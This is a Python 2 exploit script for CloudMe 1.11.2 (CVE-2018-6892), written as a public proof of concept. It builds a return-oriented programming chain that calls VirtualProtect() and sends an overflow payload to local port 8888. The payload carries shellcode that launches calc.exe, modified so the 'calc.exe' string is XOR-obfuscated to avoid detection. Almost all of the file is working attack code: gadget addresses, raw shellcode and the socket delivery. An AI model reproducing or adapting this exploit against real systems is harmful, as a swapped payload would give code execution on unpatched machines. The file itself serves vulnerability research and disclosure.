# Exploit Title: CloudMe 1.11.2 - Return Oriented Programming (ROP) Chain Exploit
# Exploit Author:  Hugo STEIGER
# CVE:             CVE-2018-6892
# Date: 2020-02-11
# Vendor Homepage: https://www.cloudme.com/
# Software Link:   https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version:         1.11.2
# Tested On:       Windows 10 (x64) - Version 10.0.19043 Build 19043
# Script:          Python 2.7
# Notes:
#   This exploit enables to launch the calculator using a ROP Chain on the software CloudMe. Once launched,
#   this Python program will send a message to the local 8888 port that CloudMe is listening to. One part
#   of this message will be interpreted by Windows through VirtualProtect() and open the calculator software.
#   In order to make this exploit work, CloudMe does not require to be run with Administrator privileges.
# This ROP chain was created with mona.py (Corelan) run on Immunity
# Debugger and tested with WinDBG(x64).

import socket
import struct


def create_rop_chain():
    rop_gadgets = [
        0x61ba8f81,  # POP EAX # RETN [Qt5Gui.dll]
        0x6210b0b0,  # ptr to &VirtualProtect() [IAT Qt5Gui.dll]
        0x61bdd7f5,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [Qt5Gui.dll]
        0x61b63b3c,  # XCHG EAX,ESI # RETN [Qt5Gui.dll]

        0x0049f676,  # POP EDI # RET [CloudMe.exe]
        0x68cef5b4,  # RET [Qt5Core.dll]

        0x61c5ff72,  # POP EBP # RET [Qt5Gui.dll]
        0x66e2a5fe,  # ptr to "push esp" [Qt5Xml.dll]

        0x699d2d92,  # POP EBX # RET [Qt5Network.dll]
        0x00000201,  # dwSize Value

        0x6d9f7736,  # POP EDX # RET [Qt5Sql.dll]
        0x00000040,  # flNewProtect Value

        0x66e1a858,  # POP ECX # RET [Qt5Xml.dll]
        0x68db0e70,  # lpflOldProtectWriting address [Qt5Core.dll]

        0x007f8c38,  # POP EAX # RET
        0x90909090,  # NOP [CloudMe.exe]

        0x68a9fe85  # PUSHAD [Qt5Core.dll]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)


rop_chain = create_rop_chain()

target = "127.0.0.1"
junk = "A" * 1052

# Compatible Shellcode for calc.exe
# https://packetstormsecurity.com/files/156478/Windows-x86-Null-Free-WinExec-Calc.exe-Shellcode.html
"""
#Initial shellcode :
shellcode =  "\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
shellcode += "\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
shellcode += "\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
shellcode += "\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
shellcode += "\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
shellcode += "\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
shellcode += "\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
shellcode += "\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
shellcode += "\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
shellcode += "\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
shellcode += "\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
shellcode += "\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
shellcode += "\x52\xff\xd0"
"""

# Modified shellcode to hide the "calc.exe" string
# "calc.exe" is XOR encoded in the shellcode, but decoded during the execution
shellcode = "\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
shellcode += "\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
shellcode += "\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
shellcode += "\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
shellcode += "\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
shellcode += "\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
shellcode += "\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
shellcode += "\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
shellcode += "\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
# .exe : #mov ecx, 0x4f524f04 #xor ecx, 0x2A2A2A2A #push ecx
shellcode += "\xB9\x04\x4F\x52\x4F\x81\xF1\x2A\x2A\x2A\x2A\x51"
# calc : mov ecx, 0x49464b49 #xor ecx, 0x2A2A2A2A #push ecx #xor ecx,ecx
shellcode += "\xB9\x49\x4B\x46\x49\x81\xF1\x2A\x2A\x2A\x2A\x51\x31\xC9"
shellcode += "\x89\xe3\x41\x51\x53\xff"
shellcode += "\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
shellcode += "\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
shellcode += "\x52\xff\xd0"

rmdr = '\x44' * (3044 - len(rop_chain) - len(shellcode))
payload = junk + rop_chain + shellcode + rmdr

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, 8888))
    s.send(payload)
    print payload
except BaseException:
    print "Error : Impossible to connect to local port 8888"
